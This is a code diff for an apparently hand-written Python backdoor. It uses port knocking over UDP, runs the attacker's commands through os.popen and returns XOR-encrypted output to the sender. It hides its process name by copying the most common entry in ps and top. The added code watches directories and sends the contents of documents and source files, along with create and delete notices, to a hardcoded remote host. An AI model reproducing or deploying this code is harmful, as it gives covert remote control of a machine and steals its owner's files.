@@ -37,19 +37,24 @@ from scapy.all import *
 import time
 import os
 from itertools import izip, cycle
-from threading import Timer
+from multiprocessing import Queue
+import netifaces as ni
 
 
+interface_list = ni.interfaces()
 ################ USER DEFINED ########################################
-INTERFACE_ = 'em1'
+INTERFACE_ = interface_list[-1]   # Can change this to customize, otherwise will use default.
 
 # Ports must be the same as the client.
 KNOCK = [1075, 2078, 3079, 4067, 5075]
 PASS = ['$f%g', '!~fD', '[";-', '|JG,', 'cfF^']
-
 CHANNEL = 80
 SEND_PORT = 443
 
+# File watching variables
+WATCH_DIR = '/tmp/test'
+MASK = pyinotify.IN_MODIFY | pyinotify.IN_CREATE | pyinotify.IN_DELETE
+EXTENTIONS = '.pdf,.docx,.doc,.txt,.rb,.py'
 # Filter is tcpdump format
 FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK[0], KNOCK[1],
                                                                             KNOCK[2], KNOCK[3], KNOCK[4], CHANNEL)
@@ -60,8 +65,9 @@ ENCRYPTION_KEY = "zdehjk"
 knockSequence = 0
 command = ''
 cmdLen = 0
-default_dest = '192.168.0.23'
-new_dest = ''
+default_dest = '192.168.0.6'
+process_list = []
+watch_queue = Queue()
 
 
 
@@ -148,42 +154,45 @@ def remoteExecute(packet):
         except Exception as ex:
             print ex.message
             print packet.show()
-        print "KnockSequence: {0}".format(knockSequence)
+        #print "KnockSequence: {0}".format(knockSequence)
     else:
         if cmdLen == 0:
             cmdLen = packet[0][2].sport
             #print cmdLen
         else:
-            print len(command)
-            print 'Command Len: ' + str(cmdLen)
+            #print len(command)
+            #print 'Command Len: ' + str(cmdLen)
             command += chr(packet[0][2].sport)
             if len(command) == cmdLen:
                 print "Running Command: " + command
-                decrypt_command = os.popen(command)
-                command_result = decrypt_command.read()
-                #print command_result
+                if command.startswith('watch') or command.startswith('remove') or command.startswith('twatch'):
+                    watch_queue.put(command)
+                else:
+                    decrypt_command = os.popen(command)
+                    command_result = decrypt_command.read()
+                    #print command_result
 
-                new_dest = packet[0][1].src
-                lines = re.split('\n', command_result)
+                    new_dest = packet[0][1].src
+                    lines = re.split('\n', command_result)
 
-                print "Sending encrypted response.."
-                # Send Knock Sequence
-                knock(new_dest)
+                    print "Sending encrypted response.."
+                    # Send Knock Sequence
+                    knock(new_dest)
 
-                # Send length of response
-                send(IP(dst=new_dest) / UDP(sport=len(lines), dport=SEND_PORT), verbose=0)
+                    # Send length of response
+                    send(IP(dst=new_dest) / UDP(sport=len(lines), dport=SEND_PORT), verbose=0)
 
-                # Send data
-                for i in range(0, len(lines) - 1):
-                    try:
-                        send(IP(dst=new_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt(lines[i]), verbose=0)
-                        print 'Sent: ' + lines[i]
-                    except Exception as ex:
-                        print ex.message
-                knockSequence = 0
-                cmdLen = 0
-                command = ''
-                return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
+                    # Send data
+                    for i in range(0, len(lines) - 1):
+                        try:
+                            send(IP(dst=new_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt(lines[i]), verbose=0)
+                            print 'Sent: ' + lines[i]
+                        except Exception as ex:
+                            print ex.message
+                    knockSequence = 0
+                    cmdLen = 0
+                    command = ''
+                    return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
 
 ######################################################################
 ##	FUNCTION:	    set_proc_name
@@ -331,7 +340,7 @@ def mask_process():
     # Gets the most common process name for ps -aux/htop
     command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
     command_result = command.read()
-    print "The most common process for ps/htop is: {0} \n".format(command_result)
+    print "The most common process for ps/htop is: {0}".format(command_result)
 
     # Masks the process for ps -aux and htop.
     setproctitle.setproctitle(command_result)
@@ -342,37 +351,85 @@ def mask_process():
 
     # Masks the process for top
     set_proc_name(command_result)
-    print "The most common process for top is: {0} \n".format(command_result)
+    print "The most common process for top is: {0}".format(command_result)
 
 
 class EventHandler(pyinotify.ProcessEvent):
-    global new_dest
     global default_dest
 
+    def my_init(self, ext=EXTENTIONS):
+        self.extensions = ext.split(',')
+
     def process_default(self, event):
+        if all(not event.pathname.endswith(ext) for ext in self.extensions):
+            return
 
-        if not new_dest:
-            knock(default_dest)
-        else:
-            knock(new_dest)
+        # Send the knock
+        knock(default_dest)
+
+        # Get number of lines to send
+        f = open(event.pathname, 'r')
+        lines = f.readlines()
+
+        # Send length of response
+        send(IP(dst=default_dest) / UDP(sport=len(lines), dport=SEND_PORT), verbose=0)
+
+        # Send data
+        for i in range(0, len(lines) - 1):
+            try:
+                send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt(lines[i]), verbose=0)
+                print 'Sent: ' + lines[i]
+            except Exception as ex:
+                print ex.message
+
+    def process_IN_DELETE(self, event):
+        if all(not event.pathname.endswith(ext) for ext in self.extensions):
+            return
+
+        knock(default_dest)
+        send(IP(dst=default_dest) / UDP(sport=1, dport=SEND_PORT), verbose=0)
+        send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt('{0} was deleted'.format(event.pathname)), verbose=0)
+
+    def process_IN_CREATE(self, event):
+        if all(not event.pathname.endswith(ext) for ext in self.extensions):
+            return
+        knock(default_dest)
+        send(IP(dst=default_dest) / UDP(sport=1, dport=SEND_PORT), verbose=0)
+        send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt('{0} was created'.format(event.pathname)), verbose=0)
 
 
-def fileMonitor():
+def fileMonitor(watch, q):
+    global MASK
+    print 'monitoring {0}'.format(WATCH_DIR)
     # Mask the file monitor process
     mask_process()
 
+
     wm = pyinotify.WatchManager()  # Watch Manager
-    notifier = pyinotify.ThreadedNotifier(wm, EventHandler())
+    handler = EventHandler()
+
+    notifier = pyinotify.ThreadedNotifier(wm, handler)
     notifier.start()
 
-    wdd = wm.add_watch('/tmp', pyinotify.ALL_EVENTS, rec=True, auto_add=True)
+    wm.add_watch(watch, MASK, rec=True, auto_add=True)
 
-def reset_ip_thread():
-    global new_dest
+    while True:
+        try:
+            new_watch = q.get(True, 1)
+            x, y = new_watch.split(' ')
+            if x == 'watch':
+                print 'Adding:', y
+                wm.add_watch(new_watch, MASK, rec=True, auto_add=True)
+            elif x == 'twatch':
+                print 'Adding transient watch:', y
+                wm.watch_transient_file(y, pyinotify.IN_MODIFY, EventHandler)
+            else:
+                print 'Removing:', y
+                wm.rm_watch(wm.get_wd(y), rec=True)
+        except Exception:
+            pass
+    #notifier.loop()
 
-    Timer(180.0, reset_ip_thread).start()
-    new_dest = ''
-    
 ###### START OF SCRIPT #######
 # To show the user what it is listening for.
 print FILTER
@@ -381,17 +438,20 @@ try:
     # Mask the processes.
     mask_process()
 
-    # Start the thread to reset the IP
-    reset_ip_thread()
-
     # Start the file watcher
-    filewatch_process = multiprocessing.Process(target=fileMonitor)
+    p = multiprocessing.Process(target=fileMonitor, args=(WATCH_DIR, watch_queue,))
+    process_list.append(p)
+    process_list[0].start()
 
     # Start sniffing for packets
     sniff(filter=FILTER, prn=remoteExecute)
 
 except KeyboardInterrupt:
+    for p in process_list:
+        p.terminate()
     sys.exit(0)
 except Exception as ex:
     print ex.message
+    for p in process_list:
+        p.terminate()
     sys.exit(1)
